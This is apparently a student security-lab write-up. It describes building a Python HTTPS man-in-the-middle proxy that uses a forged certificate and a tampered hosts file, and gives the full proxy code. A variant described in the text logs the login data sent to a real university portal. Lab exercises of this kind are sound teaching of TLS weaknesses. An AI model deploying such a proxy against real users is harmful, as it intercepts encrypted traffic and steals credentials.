# Task 3 

For this task we were required to build a HTTPS proxy and use it to launch Man-In-The-Middle Attacks where the host container is the victim that is trying to access the desired servers, this will be done through the browser.
It is assumed that the attacker managed to alter our /etc/hosts file to resolve the requested domains to our malicious HTTPS proxy.
Additionaly, the attacker has compromised a trusted CA's private key, enabling him to forge valid certificates for any web server, this is the case for HTTPS proxy

Two different scenarios were executed:
- Firstly, we will explore the case where the victim tries to access our own web server _www.example.com_ but gets proxied through our malicious proxy that redirects it to _www.google.com_
- Secondly, the same procedure will be performed in the opposite scenario, the victim tries to access _sigarra.up.pt/feup_ and gets redirected to our server

The following code was used in the HTTPS proxy:

```(python)
import threading
import socket
import ssl

def process_request(ssock_for_browser):
    hostname = 'www.example.com' # server to redirect to

    # Make a connection to the real server
    sock_for_server = socket.create_connection((hostname, 443))

    ssock_for_server = ssl.wrap_socket(sock_for_server)

    request = ssock_for_browser.recv(2048)
    if request:
        # Forward request to server
        ssock_for_server.sendall(request)

        # Get response from server, and forward it to browser
        response = ssock_for_server.recv(2048)

        while response:
            ssock_for_browser.sendall(response) # Forward to browser
            response = ssock_for_server.recv(2048)

    ssock_for_browser.shutdown(socket.SHUT_RDWR)
    ssock_for_browser.close()

def main():

    context_srv = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context_srv.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

    sock_listen = socket.socket()
    sock_listen.bind(('localhost', 10023))
    sock_listen.listen(5)

    while True:
        sock_for_browser, fromaddr = sock_listen.accept()
        ssock_for_browser = context_srv.wrap_socket(sock_for_browser,
        server_side=True)

        x = threading.Thread(target=process_request, args=(ssock_for_browser,))
        x.start()

main()
```

## First scenario

In the first case, in the browser we try to access the domain _www.example.com_, the proxy redirects him to _www.google.com_ so this domain gets served to the browser.


![www.example.com](screenshots/t3s1.png)

## Second scenario

In this case we altered the code to print the sent data to a file, we attacked the domain _sigarra.up.pt/feup_ and try to login as our account.
The data gets sent to the proxy which redirects to the actual domain but in the process, saves it to a file in the malicious server.

![sigarra.up.pt/feup](screenshots/t3s2.png)

![payload](screenshots/t3payload.png)
